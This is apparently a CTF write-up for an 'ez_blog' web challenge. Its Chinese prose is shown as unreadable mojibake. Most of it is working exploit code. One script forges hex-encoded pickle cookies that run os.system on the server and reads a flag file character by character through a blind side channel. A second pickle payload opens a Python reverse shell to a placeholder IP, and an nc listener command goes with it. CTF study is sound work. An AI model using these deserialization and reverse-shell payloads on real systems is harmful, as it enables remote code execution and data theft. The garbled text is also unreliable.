# ç¾ŠåŸæ¯

## ez_blog

æŒ‰ç…§æç¤ºä½¿ç”¨guestç™»é™†æ‹¿åˆ°token

```bash
8004954b000000000000008c03617070948c04557365729493942981947d94288c026964944b028c08757365726e616d65948c056775657374948c0869735f61646d696e94898c096c6f676765645f696e948875622e
```

åå…­è¿›åˆ¶è½¬å­—ç¬¦ä¸²å‘ç°æ˜¯pickleååºåˆ—åŒ–ï¼Œå…ˆå°è¯•æ„å»ºè¿›è¡Œrceï¼Œå°è¯•å‡ºç½‘ï¼Œä½†æ˜¯å‘ç°æœåŠ¡å™¨æ²¡æœ‰æ”¶åˆ°è¯·æ±‚ï¼Œå°è¯•ä¾§ä¿¡é“çˆ†ç ´flagåï¼Œä¹‹åè·å–flag

expå¦‚ä¸‹

```bash
import string

def gencookie(cmd):
    return (b"cos\\nsystem\\n(S\\"" + cmd.encode() + b"\\"\\ntR.").hex()

import requests as requests

url = "<http://45.40.247.139:21546/>"

def testPayload(payload):
    cookies = {
        'Token': payload
    }
    response = requests.get(url, cookies=cookies)
    
    if response.status_code == 200:
        return True
    else:
        return False
    
def search(cmd, index):
    for c in string.ascii_letters + string.digits + "{}_":
        test_cmd = f"""test=$({cmd} | head -n 1 | cut -c {index} | tr -d "\\\\n"); if [ "$test" = "{c}" ]; then exit 1; fi"""
        if (not testPayload(gencookie(test_cmd))):
            return c
        
    return "ğŸ±"

def rce(cmd):
    for i in range(100):
        print(search(cmd, i+1), end='', flush=True)

rce("cat /thisisthefffflllaaaggg.txt")
```

ç›´æ¥`cat /flag`å‘ç°æœåŠ¡ç«¯é”™è¯¯ï¼Œäºæ˜¯å…ˆ`ls /*f*`è·å–åˆ°flagåç§°ä¸º`thisisthefffflllaaaggg.txt`

ä¹‹å`cat /thisisthefffflllaaaggg.txt`è·å–åˆ°flagå†…å®¹

è¿™é“é¢˜æ˜¯ç¬¬ä¸€æ¬¡è§ä¾§ä¿¡é“ï¼Œå¥½å·§å¦™çš„æ–¹æ³•ï¼ŒåŠ å…¥payloadåº“å–µ

å½“æ—¶åšé¢˜æ—¶å€™curlæœåŠ¡å™¨æ²¡æœ‰æ”¶åˆ°è¯·æ±‚ï¼Œä»¥ä¸ºæ¯”èµ›ä¸èƒ½å‡ºç½‘ï¼Œçœ‹åšå®¢çœ‹åˆ°äº†å¦‚ä¸‹é¢˜è§£ï¼Œå·²ä¸¥è‚ƒå­¦ä¹ https://www.iyoroy.cn/archives/207/c

```python
import pickle
import time
import binascii
import os

class Exploit:
    def __reduce__(self):
        return (os.system, ('''python3 -c "import os
import socket
import subprocess
s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('<Your IP>', 2333))
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)
p = subprocess.call(['/bin/sh', '-i'])"''',))

payload = pickle.dumps(Exploit())
hex_token = binascii.hexlify(payload).decode()
print(hex_token)
print(payload)

obj = pickle.loads(payload)
```

é€šè¿‡pythonåº“åå¼¹shellï¼Œç›´æ¥`nc -lvvp 2333`ç›‘å¬å³å¯ã€‚